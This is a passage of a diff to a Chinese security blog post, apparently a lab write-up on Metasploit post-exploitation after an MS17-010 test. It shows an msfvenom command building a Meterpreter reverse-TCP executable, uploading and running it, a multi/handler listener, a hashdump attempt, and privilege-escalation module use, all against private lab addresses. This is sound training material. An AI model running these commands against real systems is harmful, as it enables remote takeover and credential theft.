+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.174.137 lport=1234 -f exe  &gt; shell.exe 
+</code></pre>
 <p>OS&#x2F;几位&#x2F;后渗透模块的反弹shell&#x2F;监听地址和端口，文件类型</p>
 <p>进入meterpreter加载exe</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload shell.exe</span><br><span class="line">[*] Uploading  : /root/shell.exe -&gt; shell.exe</span><br><span class="line">[*] Uploaded -1.00 B of 203.50 KiB (-0.0%): /root/shell.exe -&gt; shell.exe</span><br><span class="line">[*] Completed  : /root/shell.exe -&gt; shell.exe</span><br><span class="line">meterpreter &gt; ls shell.exe</span><br><span class="line">100777/rwxrwxrwx  895002465218048  fil  233592092020-04-06 21:40:02 +0800  shell.exe</span><br><span class="line">#rwx有可执行权限</span><br></pre></td></tr></table></figure>
-
+<pre><code>meterpreter &gt; upload shell.exe
+[*] Uploading  : /root/shell.exe -&gt; shell.exe
+[*] Uploaded -1.00 B of 203.50 KiB (-0.0%): /root/shell.exe -&gt; shell.exe
+[*] Completed  : /root/shell.exe -&gt; shell.exe
+meterpreter &gt; ls shell.exe
+100777/rwxrwxrwx  895002465218048  fil  233592092020-04-06 21:40:02 +0800  shell.exe
+#rwx有可执行权限
+</code></pre>
 <p>新开一个监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">#不用默认的payload，去复制木马的payload</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter_reverse_tcp</span><br><span class="line">#option设置一下</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.137</span><br><span class="line">LHOST =&gt; 192.168.174.137</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1234</span><br><span class="line">LPORT =&gt; 1234</span><br></pre></td></tr></table></figure>
-
+<pre><code>msfconsole
+#不用默认的payload，去复制木马的payload
+msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp
+payload =&gt; windows/x64/meterpreter_reverse_tcp
+#option设置一下
+msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.137
+LHOST =&gt; 192.168.174.137
+msf6 exploit(multi/handler) &gt; set LPORT 1234
+LPORT =&gt; 1234
+</code></pre>
 <p>meterpreter</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute -f shell.exe</span><br><span class="line">Process 1368 created.</span><br></pre></td></tr></table></figure>
-
+<pre><code>meterpreter &gt; execute -f shell.exe
+Process 1368 created.
+</code></pre>
 <p>获得shell后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[-] priv_passwd_get_sam_hashes: Operation failed: 1168</span><br></pre></td></tr></table></figure>
-
+<pre><code>meterpreter &gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: 1168
+</code></pre>
 <p>这里报错是权限不够，而不是没有这个命令</p>
-<h3 id="msf提权模块"><a href="#msf提权模块" class="headerlink" title="msf提权模块"></a>msf提权模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#use post/multi/recon/local_exploit_suggester</span><br><span class="line">#Msf里能够提权的模块还有很多如use exploit/windows/local/ms16_016_webdav （可能需要使用migrate迁移一下进程）</span><br><span class="line">#先把会话放在后台</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 16...</span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">options</span><br><span class="line">设置下会话，可以用sessions命令查看</span><br></pre></td></tr></table></figure>
-
+<h3 id="msf提权模块"><a href="#msf提权模块" class="headerlink" title="msf提权模块"></a>msf提权模块</h3><pre><code>#use post/multi/recon/local_exploit_suggester
+#Msf里能够提权的模块还有很多如use exploit/windows/local/ms16_016_webdav （可能需要使用migrate迁移一下进程）
+#先把会话放在后台
+meterpreter &gt; background
+[*] Backgrounding session 16...
+use post/multi/recon/local_exploit_suggester
+options
+设置下会话，可以用sessions命令查看
+</code></pre>
 <p>这个会返回很多的可用payload，需要一个一个测试</p>
 </article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/">http://example.com/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/msf/">msf</a><a class="post-meta__tags" href="/tags/ms17-010/">ms17_010</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/" title="一个CPU平均使用率脚本"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一个CPU平均使用率脚本</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="一些读书笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一些读书笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/youzipii"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6"><span class="toc-text">综合渗透测试框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%8C%E4%B8%8D%E7%84%B6%E5%86%85%E7%BD%AE%E7%9A%84db-namp%E7%AD%89%E6%8C%87%E4%BB%A4%E7%94%A8%E4%B8%8D%E4%BA%86"><span class="toc-text">初始化，不然内置的db_namp等指令用不了</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B8%AE%E5%8A%A9%E6%8C%87%E4%BB%A4"><span class="toc-text">常用帮助指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Auxiliary%E6%A8%A1%E5%9D%97%EF%BC%9Ashow-auxiliary"><span class="toc-text">Auxiliary模块：show auxiliary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploits%E6%A8%A1%E5%9D%97%EF%BC%9Ashow-exploits"><span class="toc-text">Exploits模块：show exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-%E6%A8%A1%E5%9D%97"><span class="toc-text">Payload 模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-text">实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%90%8D%E7%A7%B0%E6%90%9C%E7%B4%A2"><span class="toc-text">根据名称搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%A8%A1%E5%9D%97"><span class="toc-text">设置模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA"><span class="toc-text">扫描靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%B6%E6%9C%BA"><span class="toc-text">攻击靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9payload"><span class="toc-text">选择payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%BA%8C"><span class="toc-text">实验环境二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA-1"><span class="toc-text">扫描靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-text">攻击模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS15-051-KB3045171"><span class="toc-text">MS15-051-KB3045171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-text">法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%8F%90%E6%9D%83%E6%A8%A1%E5%9D%97"><span class="toc-text">msf提权模块</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/pikachu/" title="pikachu">pikachu</a><time datetime="2024-08-11T02:45:29.000Z" title="发表于 2024-08-11 10:45:29">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/vulhub-tomcat/" title="vulhub-tomcat">vulhub-tomcat</a><time datetime="2024-08-11T02:44:16.000Z" title="发表于 2024-08-11 10:44:16">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/vulhub-fastjson/" title="vulhub-fastjson">vulhub-fastjson</a><time datetime="2024-08-11T02:41:47.000Z" title="发表于 2024-08-11 10:41:47">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/10/%E5%88%A4%E6%96%ADip%E7%BB%83%E4%B9%A0-python/" title="判断ip练习-python">判断ip练习-python</a><time datetime="2024-08-10T04:03:42.000Z" title="发表于 2024-08-10 12:03:42">2024-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/09/vulnhub-shiro/" title="vulnhub-shiro">vulnhub-shiro</a><time datetime="2024-08-09T05:01:46.000Z" title="发表于 2024-08-09 13:01:46">2024-08-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/bk_image/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
